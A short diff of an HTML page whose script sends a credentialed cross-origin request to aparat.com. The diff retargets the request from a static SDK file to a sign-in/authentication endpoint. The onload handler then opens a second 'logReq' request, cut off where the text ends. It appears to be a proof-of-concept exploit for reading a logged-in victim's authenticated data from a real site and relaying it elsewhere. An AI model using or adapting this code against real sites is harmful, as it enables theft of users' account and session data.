@@ -3,7 +3,7 @@
 <body>
 <script>
     var req = new XMLHttpRequest();
-    req.open('GET', 'https://www.aparat.com/redesign/static/vendor/surtur-web-sdk-1.8.6.js', true);
+    req.open('GET', 'https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step2?returnUrl=%2Fdashboard%2Fincome%2Frequest', true);
     req.withCredentials = true;
     req.onload = function() {
         var logReq = new XMLHttpRequest();
